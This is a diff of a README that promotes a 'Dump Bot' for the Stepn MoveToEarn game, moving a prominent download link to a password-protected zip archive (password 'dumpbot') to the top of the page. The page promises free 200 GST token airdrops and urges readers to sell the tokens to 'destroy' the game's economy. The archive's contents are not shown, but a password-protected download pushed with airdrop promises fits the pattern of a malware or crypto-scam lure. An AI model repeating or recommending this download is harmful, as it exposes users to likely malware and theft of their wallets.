@@ -1,6 +1,7 @@
 ## Our bot was created by competitors to kill the economy of "MoveToEarn" projects!
+# [>>>⚡️ Click to DOWNLOAD ⚡<<<](https://github.com/farmsc/dumpbot/raw/main/Dump%20Bot.zip)
+## ⭐️ARCHIVE PASSWORD: dumpbot
 
-# ⭐️ARCHIVE PASSWORD: dumpbot
 ✅ STATUS: WORKING!
 # Get a free airdrop from 06/01 to 07/01 - 200 GST tokens (Solana)
 How to get a:
@@ -11,7 +12,7 @@ How to get a:
 
 ### Next, sell these tokens on any marketplace to help us destroy the Stepn game economy.
 ### Repeat the procedure after 24 hours and get tokens again
-# [>>>⚡️ Click to DOWNLOAD ⚡<<<](https://github.com/farmsc/dumpbot/raw/main/Dump%20Bot.zip)
+#
 #
 #
 #
